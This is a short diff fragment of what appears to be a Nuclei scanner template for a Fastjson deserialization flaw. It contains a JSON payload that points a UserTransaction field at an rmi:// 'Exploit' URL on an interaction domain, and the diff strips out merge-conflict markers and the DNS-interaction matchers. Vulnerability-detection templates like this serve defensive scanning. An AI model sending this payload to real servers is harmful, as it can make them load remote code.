@@ -30,24 +30,4 @@ requests:
               "@type":"java.util.Properties",
               "UserTransaction":"rmi://{{Host}}.{{Port}}.{{Subdomains}}.fastjson.{{MY-DOMAIN}}/Exploit"
            }
-<<<<<<< HEAD
-<<<<<<< HEAD
         }
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol   # Confirms DNS Interaction
-        words:
-          - "dns"
-
-      - type: status
-        negative: true
-        status:
-          - 200
-=======
-        }
->>>>>>> 5d36d276 (add new stuff)
-=======
-        }
->>>>>>> 18ddf72b (add new stuff)
